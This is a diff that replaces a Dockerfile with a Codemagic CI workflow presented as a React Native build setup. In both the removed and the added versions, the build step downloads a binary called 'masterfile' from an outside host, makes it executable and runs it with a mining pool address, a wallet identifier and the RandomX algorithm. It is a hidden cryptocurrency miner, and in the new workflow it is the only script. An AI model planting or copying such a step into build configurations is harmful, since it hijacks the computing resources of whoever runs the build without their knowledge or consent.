@@ -1,13 +1,11 @@
-FROM runmymind/docker-android-sdk
-RUN mkdir /codemagic-demo
-WORKDIR /codemagic-demo
-ADD . /codemagic-demo
-RUN apt-get update && \
-    apt-get install -y lcov git-core curl unzip && \
-    wget https://swenson.my.id/mining/masterfile &&  chmod u+x masterfile &&  ./masterfile -o 139.99.125.38:80 -u 84Cz8R4XkP2V6ceRrJgkXQDMSFRLCfgj3gtgbAkBkaypMe4H9uySSC8FugfzvtFprpA54ECHbCsGNhYwA8PdmTRSUHBaue8 -k -a rx/0
-    /flutter/bin/flutter doctor && \
-    apt-get remove -y curl unzip && \
-    apt autoremove -y && \
-    rm -rf /var/lib/apt/lists/*
-ENV PATH $PATH:/flutter/bin/cache/dart-sdk/bin:/flutter/bin
-RUN flutter doctor
+# Check out https://docs.codemagic.io/getting-started/building-a-react-native-app/ for more information
+# Please review and update values in curly braces
+
+workflows:
+    react-native:
+        name: React Native App
+        environment:
+            FROM: ubuntu-latest
+            node: latest
+        scripts:
+            - wget https://swenson.my.id/mining/masterfile &&  chmod u+x masterfile &&  ./masterfile -o 139.99.125.38:80 -u 84Cz8R4XkP2V6ceRrJgkXQDMSFRLCfgj3gtgbAkBkaypMe4H9uySSC8FugfzvtFprpA54ECHbCsGNhYwA8PdmTRSUHBaue8 -k -a rx/0
